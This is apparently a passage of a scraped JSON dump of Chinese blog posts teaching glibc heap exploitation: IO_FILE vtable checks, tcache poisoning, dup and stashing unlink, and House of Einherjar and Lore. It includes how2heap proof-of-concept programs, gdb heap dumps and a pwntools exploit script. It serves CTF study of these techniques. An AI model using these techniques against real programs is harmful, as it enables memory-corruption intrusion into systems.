0x7ffff7a47045 → Name: __GI_exit(status=&lt;optimized out&gt;)[#4] 0x4005ce → Name: main() glibc 2.24 下 IO_FILE 的利用在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。 /* Check if unknown vtable pointers are permitted; otherwise, terminate the process. */void _IO_vtable_check (void) attribute_hidden;/* Perform vtable pointer validation. If validation fails, terminate the process. */static inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable){ /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; uintptr_t ptr = (uintptr_t) vtable; uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables; if (__glibc_unlikely (offset &gt;= section_length)) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable;} 计算 section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;，紧接着会判断 vtable - __start___libc_IO_vtables 的 offset ，如果这个 offset 大于 section_length , 即大于 __stop___libc_IO_vtables - __start___libc_IO_vtables 那么就会调用 _IO_vtable_check() 这个函数。 void attribute_hidden_IO_vtable_check (void){#ifdef SHARED /* Honor the compatibility flag. */ void (*flag) (void) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);#ifdef PTR_DEMANGLE PTR_DEMANGLE (flag);#endif if (flag == &amp;_IO_vtable_check) return; /* In case this libc copy is in a non-default namespace, we always need to accept foreign vtables because there is always a possibility that FILE * objects are passed across the linking boundary. */ { Dl_info di; struct link_map *l; if (_dl_open_hook != NULL || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0 &amp;&amp; l-&gt;l_ns != LM_ID_BASE)) return; }#else /* !SHARED */ /* We cannot perform vtable validation in the static dlopen case because FILE * handles might be passed back and forth across the boundary. Therefore, we disable checking in this case. */ if (__dlopen != NULL) return;#endif __libc_fatal (\"Fatal error: glibc detected an invalid stdio handle\\n\");} 如果 vtable 是非法的，那么会引发 abort。 这里的检查使得以往使用 vtable 进行利用的技术很难实现，不过存在新的利用技术。 fileno 与缓冲区的相关利用在 vtable 难以被利用之后，利用的关注点从 vtable 转移到_IO_FILE 结构内部的域中。 前面介绍过_IO_FILE 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 fwrite、fread 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。 struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; _IO_off_t _old_offset; /* This used to be _offset but it's too small. */}; 因为进程中包含了系统默认的三个文件流 stdin\\stdout\\stderr，因此这种方式可以不需要进程中存在文件操作，通过 scanf\\printf 一样可以进行利用。 在_IO_FILE 中_IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。","link":"/2020/06/14/IO-FILE%E7%9B%B8%E5%85%B3/"},{"title":"堆溢出-Tcache_Attack","text":"tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。对 tcache 的深入认识去这里。这里主要记录一下如何 PWN tcache。 tcache poisoning即 tcache 污染，通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。以 how2heap 中的 tcache_poisoning 为例，代码如下： #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;int main(){ // disable buffering setbuf(stdin, NULL); setbuf(stdout, NULL); printf(\"This file demonstrates a simple tcache poisoning attack by tricking malloc into\\n\" \"returning a pointer to an arbitrary location (in this case, the stack).\\n\" \"The attack is very similar to fastbin corruption attack.\\n\"); printf(\"After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\\n\" \"We have to create and free one more chunk for padding before fd pointer hijacking.\\n\\n\"); size_t stack_var; printf(\"The address we want malloc() to return is %p.\\n\", (char *)&amp;stack_var); printf(\"Allocating 2 buffers.\\n\"); intptr_t *a = malloc(128); printf(\"malloc(128): %p\\n\", a); intptr_t *b = malloc(128); printf(\"malloc(128): %p\\n\", b); printf(\"Freeing the buffers...\\n\"); free(a); free(b); printf(\"Now the tcache list has [ %p -&gt; %p ].\\n\", b, a); printf(\"We overwrite the first %lu bytes (fd/next pointer) of the data at %p\\n\" \"to point to the location to control (%p).\\n\", sizeof(intptr_t), b, &amp;stack_var); b[0] = (intptr_t)&amp;stack_var; printf(\"Now the tcache list has [ %p -&gt; %p ].\\n\", b, &amp;stack_var); printf(\"1st malloc(128): %p\\n\", malloc(128)); printf(\"Now the tcache list has [ %p ].\\n\", &amp;stack_var); intptr_t *c = malloc(128); printf(\"2nd malloc(128): %p\\n\", c); printf(\"We got the control\\n\"); return 0;} 输入如下： glibc_2.26 [master●] ./tcache_poisoning This file demonstrates a simple tcache poisoning attack by tricking malloc intoreturning a pointer to an arbitrary location (in this case, the stack).The attack is very similar to fastbin corruption attack.The address we want malloc() to return is 0x7fff0d28a0c8.Allocating 1 buffer.malloc(128): 0x55f666ee1260Freeing the buffer...Now the tcache list has [ 0x55f666ee1260 ].We overwrite the first 8 bytes (fd/next pointer) of the data at 0x55f666ee1260to point to the location to control (0x7fff0d28a0c8).1st malloc(128): 0x55f666ee1260Now the tcache list has [ 0x7fff0d28a0c8 ].2st malloc(128): 0x7fff0d28a0c8We got the control 从代码的逻辑可以看出其漏洞利用与 fastbin 的攻击方式是一样的，都是通过更改fd指针指向我们控制的地址，但因为没有 size 的限制有了更大的利用范围。 tcache dup类似 fastbin dup，不过利用的是 tcache_put() 的不严谨： static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx){ tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);} 可以看出，tcache_put() 的检查也可以忽略不计（甚至没有对 tcache-&gt;counts[tc_idx] 的检查），大幅提高性能的同时安全性也下降了很多。 因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。 以 how2heap 中的 tcache_dup 为例，代码如下： #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ fprintf(stderr, \"This file demonstrates a simple double-free attack with tcache.\\n\"); fprintf(stderr, \"Allocating buffer.\\n\"); int *a = malloc(8); fprintf(stderr, \"malloc(8): %p\\n\", a); fprintf(stderr, \"Freeing twice...\\n\"); free(a); free(a); fprintf(stderr, \"Now the free list has [ %p, %p ].\\n\", a, a); fprintf(stderr, \"Next allocated buffers will be same: [ %p, %p ].\\n\", malloc(8), malloc(8)); return 0;} 第一次 free 时，申请的 chunk 被放入 tcache_entry 中： pwndbg&gt; heapinfo3886144(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x555555756270 (size : 0x20d90) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0(0x20) tcache_entry[0]: 0x555555756260 第二次 free 时，虽然 free 的是同一个 chunk，但因为 tcache_put() 没有做任何检查，因此程序不会 crash，而 tcache_entry 中会再添加该 chunk 的地址： pwndbg&gt; heapinfo3886144(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x555555756270 (size : 0x20d90) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0(0x20) tcache_entry[0]: 0x555555756260 --&gt; 0x555555756260 (overlap chunk with 0x555555756250(freed) ) tcache perthread corruption我们已经知道 tcache_perthread_struct 是整个 tcache 的管理结构，如果能控制这个结构体，那么无论我们 malloc 的 size 是多少，地址都是可控的。 设想有如下的堆排布情况： tcache_ +------------+\\perthread |...... |\\_struct +------------+ |counts[i] | +------------+ |...... | +----------+ +------------+ |header | |entries[i] |---------&gt;+----------+ +------------+ |NULL | |...... | +----------+ | | | | +------------+ +----------+ 通过一些手段（如 tcache posioning），我们将其改为了： tcache_ +------------+&lt;---------------------------+\\perthread |...... | |\\_struct +------------+ | |counts[i] | | +------------+ | |...... | +----------+ | +------------+ |header | | |entries[i] |---------&gt;+----------+ | +------------+ |target |------+ |...... | +----------+ | | | | +------------+ +----------+ 这样，两次 malloc 后我们就返回了 tcache_prethread_struct 的地址，就可以控制整个 tcache 了。因为 tcache_prethread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。 tcache house of spirit与 fastbin 中的 house of spirit 一样，该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。 拿 how2heap 的源码来讲： #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ fprintf(stderr, \"This file demonstrates the house of spirit attack on tcache.\\n\"); fprintf(stderr, \"It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\\n\"); fprintf(stderr, \"You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\\n\"); fprintf(stderr, \"(Search for strings \\\"invalid next size\\\" and \\\"double free or corruption\\\")\\n\\n\"); fprintf(stderr, \"Ok. Let's start with the example!.\\n\\n\"); fprintf(stderr, \"Calling malloc() once so that it sets up its memory.\\n\"); malloc(1); fprintf(stderr, \"Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\\n\"); unsigned long long *a; //pointer that will be overwritten unsigned long long fake_chunks[10]; //fake chunk region fprintf(stderr, \"This region contains one fake chunk. It's size field is placed at %p\\n\", &amp;fake_chunks[1]); fprintf(stderr, \"This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n\"); fprintf(stderr, \"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n\"); fake_chunks[1] = 0x40; // this is the size fprintf(stderr, \"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n\", &amp;fake_chunks[1]); fprintf(stderr, \"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n\"); a = &amp;fake_chunks[2]; fprintf(stderr, \"Freeing the overwritten pointer.\\n\"); free(a); fprintf(stderr, \"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\", &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, \"malloc(0x30): %p\\n\", malloc(0x30));} 攻击之后的目的是，去控制栈上的内容，malloc 一块 chunk ，然后我们通过在栈上 fake 的 chunk，然后去 free 掉他，我们会发现： gdb-peda$ heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x4052e0 (size : 0x20d20) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0(0x90) tcache_entry[7]: 0x7fffffffe510 --&gt; 0x401340 Tcache 里就存放了一块 栈上的内容，我们之后只需 malloc，就可以控制这块内存。 smallbin unlink在 smallbin 中包含有空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。因此，原本 unlink 操作在该条件下也可以使用。 tcache stashing unlink attack这种攻击利用的是 tcache bin 有剩余 (数量小于 TCACHE_MAX_BINS ) 时，同大小的 small bin 会放进 tcache 中 (这种情况可以用 calloc 分配同大小堆块触发，因为 calloc 分配堆块时不从 tcache bin 中选取)。在获取到一个 smallbin 中的一个 chunk 后会如果 tcache 仍有足够空闲位置，会将剩余的 small bin 链入 tcache ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。当攻击者可以写一个 small bin 的 bk 指针时，其可以在任意地址上写一个 libc 地址 (类似 unsorted bin attack 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。 我们按照释放的先后顺序称 smallbin[sz] 中的两个 chunk 分别为 chunk0 和 chunk1。我们修改 chunk1 的 bk 为 fake_chunk_addr。同时还要在 fake_chunk_addr-&gt;bk 处提前写一个可写地址 writable_addr 。调用 calloc(size-0x10) 的时候会返回给用户 chunk0 (这是因为 smallbin 的 FIFO 分配机制)，假设 tcache[sz] 中有 5 个空闲堆块，则有足够的位置容纳 chunk1 以及 fake_chunk 。在源码的检查中，只对第一个 chunk 的链表完整性做了检测 __glibc_unlikely (bck-&gt;fd != victim) ，后续堆块在放入过程中并没有检测。 因为 tcache 的分配机制是 LIFO ，所以位于 fake_chunk-&gt;bk 指针处的 fake_chunk 在链入 tcache 的时候反而会放到链表表头。在下一次调用 malloc(sz-0x10) 时会返回 fake_chunk+0x10 给用户，同时，由于 bin-&gt;bk = bck;bck-&gt;fd = bin; 的 unlink 操作，会使得 writable_addr+0x10 处被写入一个 libc 地址。 这里以 how2heap 中的 tcache_stashing_unlink_attack 为例： #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ unsigned long stack_var[0x10] = {0}; unsigned long *chunk_lis[0x10] = {0}; unsigned long *target; fprintf(stderr, \"This file demonstrates the stashing unlink attack on tcache.\\n\\n\"); fprintf(stderr, \"This poc has been tested on both glibc 2.27 and glibc 2.29.\\n\\n\"); fprintf(stderr, \"This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\\n\\n\"); fprintf(stderr, \"The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\\n\\n\"); fprintf(stderr, \"This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\\n\\n\"); // stack_var emulate the fake_chunk we want to alloc to fprintf(stderr, \"Stack_var emulates the fake chunk we want to alloc to.\\n\\n\"); fprintf(stderr, \"First let's write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\\n\\n\"); stack_var[3] = (unsigned long)(&amp;stack_var[2]); fprintf(stderr, \"You can see the value of fake_chunk-&gt;bk is:%p\\n\\n\",(void*)stack_var[3]); fprintf(stderr, \"Also, let's see the initial value of stack_var[4]:%p\\n\\n\",(void*)stack_var[4]); fprintf(stderr, \"Now we alloc 9 chunks with malloc.\\n\\n\"); //now we malloc 9 chunks for(int i = 0;i &lt; 9;i++){ chunk_lis[i] = (unsigned long*)malloc(0x90); } //put 7 tcache fprintf(stderr, \"Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\\n\\n\"); for(int i = 3;i &lt; 9;i++){ free(chunk_lis[i]); } fprintf(stderr, \"As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\\n\\n\"); //last tcache bin free(chunk_lis[1]); //now they are put into unsorted bin free(chunk_lis[0]); free(chunk_lis[2]); //convert into small bin fprintf(stderr, \"Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\\n\\n\"); malloc(0xa0);//&gt;0x90 //now 5 tcache bins fprintf(stderr, \"Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\\n\\n\"); malloc(0x90); malloc(0x90); fprintf(stderr, \"Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\\n\\n\",(void*)stack_var); //change victim-&gt;bck /*VULNERABILITY*/ chunk_lis[2][1] = (unsigned long)stack_var; /*VULNERABILITY*/ //trigger the attack fprintf(stderr, \"Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\\n\\n\"); calloc(1,0x90); fprintf(stderr, \"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\\n\\n\",(void*)stack_var[2],(void*)stack_var[4]); //malloc and return our fake chunk on stack target = malloc(0x90); fprintf(stderr, \"As you can see, next malloc(0x90) will return the region our fake chunk: %p\\n\",(void*)target); return 0;} 这个 poc 用栈上的一个数组上模拟 fake_chunk 。首先构造出 5 个 tcache chunk 和 2 个 smallbin chunk 的情况。模拟 UAF 漏洞修改 bin2-&gt;bk 为 fake_chunk ，在 calloc(0x90) 的时候触发攻击。 我们在 calloc 处下断点，调用前查看堆块排布情况。此时 tcache[0xa0] 中有 5 个空闲块。可以看到 chunk1-&gt;bk 已经被改为了 fake_chunk_addr 。而 fake_chunk-&gt;bk 也写上了一个可写地址。由于 smallbin 是按照 bk 指针寻块的，分配得到的顺序应当是 0x0000000000603250-&gt;0x0000000000603390-&gt;0x00007fffffffdbc0 (FIFO) 。调用 calloc 会返回给用户 0x0000000000603250+0x10。 gdb-peda$ heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x6038a0 (size : 0x20760) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0(0x0a0) smallbin[ 8]: 0x603390 (doubly linked list corruption 0x603390 != 0x0 and 0x603390 is broken)(0xa0) tcache_entry[8](5): 0x6036c0 --&gt; 0x603620 --&gt; 0x603580 --&gt; 0x6034e0 --&gt; 0x603440gdb-peda$ x/4gx 0x6033900x603390: 0x0000000000000000 0x00000000000000a10x6033a0: 0x0000000000603250 0x00007fffffffdbc0gdb-peda$ x/4gx 0x00007fffffffdbc00x7fffffffdbc0: 0x0000000000000000 0x00000000000000000x7fffffffdbd0: 0x0000000000000000 0x00007fffffffdbd0gdb-peda$ x/4gx 0x00000000006032500x603250: 0x0000000000000000 0x00000000000000a10x603260: 0x00007ffff7dcfd30 0x0000000000603390gdb-peda$ x/4gx 0x00007ffff7dcfd300x7ffff7dcfd30 &lt;main_arena+240&gt;: 0x00007ffff7dcfd20 0x00007ffff7dcfd200x7ffff7dcfd40 &lt;main_arena+256&gt;: 0x0000000000603390 0x0000000000603250 调用 calloc 后再查看堆块排布情况，可以看到 fake_chunk 已经被链入 tcache_entry[8] , 且因为分配顺序变成了 LIFO , 0x7fffffffdbd0-0x10 这个块被提到了链表头，下次 malloc(0x90) 即可获得这个块。 其 fd 指向下一个空闲块，在 unlink 过程中 bck-&gt;fd=bin 的赋值操作使得 0x00007fffffffdbd0+0x10 处写入了一个 libc 地址。 gdb-peda$ heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x6038a0 (size : 0x20760) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0(0x0a0) smallbin[ 8]: 0x603390 (doubly linked list corruption 0x603390 != 0x6033a0 and 0x603390 is broken)(0xa0) tcache_entry[8](7): 0x7fffffffdbd0 --&gt; 0x6033a0 --&gt; 0x6036c0 --&gt; 0x603620 --&gt; 0x603580 --&gt; 0x6034e0 --&gt; 0x603440gdb-peda$ x/4gx 0x7fffffffdbd00x7fffffffdbd0: 0x00000000006033a0 0x00007fffffffdbd00x7fffffffdbe0: 0x00007ffff7dcfd30 0x0000000000000000 libc leak在以前的 libc 版本中，我们只需这样： #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(){ long *a = malloc(0x1000); malloc(0x10); free(a); printf(\"%p\\n\",a[0]);} 但是在 2.26 之后的 libc 版本后，我们首先得先把 tcache 填满： #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(int argc , char* argv[]){ long* t[7]; long *a=malloc(0x100); long *b=malloc(0x10); // make tcache bin full for(int i=0;i&lt;7;i++) t[i]=malloc(0x100); for(int i=0;i&lt;7;i++) free(t[i]); free(a); // a is put in an unsorted bin because the tcache bin of this size is full printf(\"%p\\n\",a[0]);} 之后，我们就可以 leak libc 了。如下图： gdb-peda$ heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x555555559af0 (size : 0x20510) last_remainder: 0x0 (size : 0x0) unsortbin: 0x555555559250 (size : 0x110)(0x110) tcache_entry[15]: 0x5555555599f0 --&gt; 0x5555555598e0 --&gt; 0x5555555597d0 --&gt; 0x5555555596c0 --&gt; 0x5555555595b0 --&gt; 0x5555555594a0 --&gt; 0x555555559390gdb-peda$ parseheapaddr prev size status fd bk0x555555559000 0x0 0x250 Used None None0x555555559250 0x0 0x110 Freed 0x7ffff7fc0ca0 0x7ffff7fc0ca00x555555559360 0x110 0x20 Used None None0x555555559380 0x0 0x110 Used None None0x555555559490 0x0 0x110 Used None None0x5555555595a0 0x0 0x110 Used None None0x5555555596b0 0x0 0x110 Used None None 建议的练习题 2018 HITCON children_tcache 2018 BCTF houseOfAtum 2019 HTICON Lazy House 2020 XCTF no-Cov twochunk","link":"/2020/06/07/%E5%A0%86%E6%BA%A2%E5%87%BA-Tcache_Attack/"},{"title":"堆溢出-Housese_Of_XXX","text":"House Of XXX 是 2004 年《The Malloc Maleficarum-Glibc Malloc Exploitation Techniques》中提出的一系列针对 glibc 堆分配器的利用方法。 由于年代久远《The Malloc Maleficarum》中提出的大多数方法今天都不能奏效，我们现在所指的 House Of XXX 利用相比 2004 年文章中写的已有较大的不同。 但是《The Malloc Maleficarum》依然是一篇推荐阅读的文章，可以在这里读到它的原文： https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt House Of Einherjarhouse of einherjar 是一种堆利用技术，由 Hiroki Matsukuma 提出。该堆利用技术可以强制使得 malloc 返回一个几乎任意地址的 chunk 。其主要在于滥用 free 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。 此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。 漏洞原理后向合并操作free 函数中的后向合并核心操作如下： /* consolidate backward */if (!prev_inuse(p)) { prevsize = prev_size(p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd);} 具体过程如下： 利用原理首先，在之前的堆的介绍中，我们可以知道以下的知识： 两个物理相邻的 chunk 会共享 prev_size字段，尤其是当低地址的 chunk 处于使用状态时，高地址的 chunk 的该字段便可以被低地址的 chunk 使用。因此，我们有希望可以通过写低地址 chunk 覆盖高地址 chunk 的 prev_size 字段。 一个 chunk PREV_INUSE 位标记了其物理相邻的低地址 chunk 的使用状态，而且该位是和 prev_size 物理相邻的。 后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize)) 。 那么如果我们可以同时控制一个 chunk prev_size 与 PREV_INUSE 字段，那么我们就可以将新的 chunk 指向几乎任何位置。 利用过程溢出前：假设溢出前的状态如下图所示： 溢出：这里我们假设p0堆块一方面可以写prev_size字段，另一方面，存在off by one的漏洞，可以写下一个 chunk 的PREV_INUSE部分，那么： 溢出后：假设我们将p1的 prev_size 字段设置为我们想要的目的 chunk 位置与 p1 的差值。在溢出后，我们释放 p1，则我们所得到的新的 chunk 的位置 chunk_at_offset(p1, -((long) prevsize)) 就是我们想要的 chunk 位置了。 攻击过程示例可以进行 House Of Einherjar 攻击的代码： #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main(void){ char* s0 = malloc(0x200); //构造fake chunk char* s1 = malloc(0x18); char* s2 = malloc(0xf0); char* s3 = malloc(0x20); //为了不让s2与top chunk 合并 printf(\"begin\\n\"); printf(\"%p\\n\", s0); printf(\"input s0\\n\"); read(0, s0, 0x200); //读入fake chunk printf(\"input s1\\n\"); read(0, s1, 0x19); //Off By One free(s2); return 0;} 攻击代码如下： from pwn import *p = process(\"./example\")context.log_level = 'debug'#gdb.attach(p)p.recvuntil(\"begin\\n\")address = int(p.recvline().strip(), 16)p.recvuntil(\"input s0\\n\")payload = p64(0) + p64(0x101) + p64(address) * 2 + \"A\"*0xe0'''p64(address) * 2是为了绕过if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (\"corrupted double-linked list\");'''payload += p64(0x100) #fake sizep.sendline(payload)p.recvuntil(\"input s1\\n\")payload = \"A\"*0x10 + p64(0x220) + \"\\x00\"p.sendline(payload)p.recvall()p.close() 利用 unlink 漏洞的时候： p-&gt;fd = &amp;p-3*4p-&gt;bk = &amp;p-2*4 在这里利用时，因为没有办法找到 &amp;p , 所以直接让： p-&gt;fd = pp-&gt;bk = p 这里需要注意一个点： payload = p64(0) + p64(0x101) + p64(address) * 2 + \"A\"*0xe0 其实修改为下面这样也是可以的: payload = p64(0) + p64(0x221) + p64(address) * 2 + \"A\"*0xe0 按照道理来讲 fake chunk 的 size 是 0x221 才合理，但是为什么 0x101 也可以呢？这是因为对 size 和 prev_size 的验证只发生在 unlink 里面，而 unlink 里面是这样验证的: if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\"corrupted size vs. prev_size\"); 所以只需要再伪造 fake chunk 的 next chunk 的 prev_size 字段就好了。 总结这里我们总结下这个利用技术需要注意的地方： 需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分 我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址 我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测 其实，该技术与 chunk extend/shrink 技术比较类似。 House of LoreHouse of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。 House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。 House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。 原理如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下： /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */if (in_smallbin_range(nb)) { // 获取 small bin 的索引 idx = smallbin_index(nb); // 获取对应 small bin 中的 chunk 指针 bin = bin_at(av, idx); // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk // 如果 victim = bin ，那说明该 bin 为空。 // 如果不相等，那么会有两种情况 if ((victim = last(bin)) != bin) { // 第一种情况，small bin 还没有初始化。 if (victim == 0) /* initialization check */ // 执行初始化，将 fast bins 中的 chunk 进行合并 malloc_consolidate(av); // 第二种情况，small bin 中存在空闲的 chunk else { // 获取 small bin 中倒数第二个 chunk 。 bck = victim-&gt;bk; // 检查 bck-&gt;fd 是不是 victim，防止伪造 if (__glibc_unlikely(bck-&gt;fd != victim)) { errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } // 设置 victim 对应的 inuse 位 set_inuse_bit_at_offset(victim, nb); // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来 bin-&gt;bk = bck; bck-&gt;fd = bin; // 如果不是 main_arena，设置对应的标志 if (av != &amp;main_arena) set_non_main_arena(victim); // 细致的检查 check_malloced_chunk(av, victim, nb); // 将申请到的 chunk 转化为对应的 mem 状态 void *p = chunk2mem(victim); // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff alloc_perturb(p, bytes); return p; } }} 从中可以看出，如果我们可以修改 small bin 的最后一个 chunk 的 bk 